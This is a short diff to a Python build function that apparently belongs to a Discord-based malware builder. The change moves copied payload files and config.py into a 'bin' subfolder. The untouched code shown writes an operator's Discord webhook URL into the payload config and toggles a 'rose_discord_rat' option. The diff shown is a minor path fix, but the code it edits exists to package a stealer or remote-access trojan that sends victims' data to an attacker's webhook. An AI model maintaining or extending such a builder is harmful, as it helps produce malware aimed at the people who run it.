@@ -228,8 +228,9 @@ def _makebuild(q: Queue, data_builder) -> str:
         try:
             logging.info("Entering get_files")
             cwd = os.path.join(os.getcwd(), "resources", "source", "bin")
+            os.mkdir(os.path.join(path, "bin"))
             for file in os.listdir(cwd):
-                shutil.copy(os.path.join(cwd, file), path)
+                shutil.copy(os.path.join(cwd, file), os.path.join(path, "bin"))
             shutil.copy(os.path.join(os.getcwd(), "resources", "source", "main.py"), path)
             logger.info(f'Successfully copied all files from {cwd} to {path}')
         except Exception as e:
@@ -238,7 +239,7 @@ def _makebuild(q: Queue, data_builder) -> str:
     def edit_config():
         try:
             logger.info("Entered edit_config")
-            with open(f"{path}\\config.py","r",encoding="utf-8") as f:
+            with open(f"{path}\\bin\\config.py","r",encoding="utf-8") as f:
                 text = f.read()
                 new = text.replace("WEBHOOK_URL", f"{replace_discord_url(data_builder['webhook_url'])}") \
                 .replace("rose_discord_rat = False", f"rose_discord_rat = {data_builder['rose_rat']}") \
@@ -282,7 +283,7 @@ def _makebuild(q: Queue, data_builder) -> str:
 
                 # noqa: E501
                 
-            with open(f"{path}\\config.py", "w", encoding="utf-8") as f:
+            with open(f"{path}\\bin\\config.py", "w", encoding="utf-8") as f:
                 f.write(new)
         except Exception as e:
             logger.error(f"Error in edit_config: {e}")
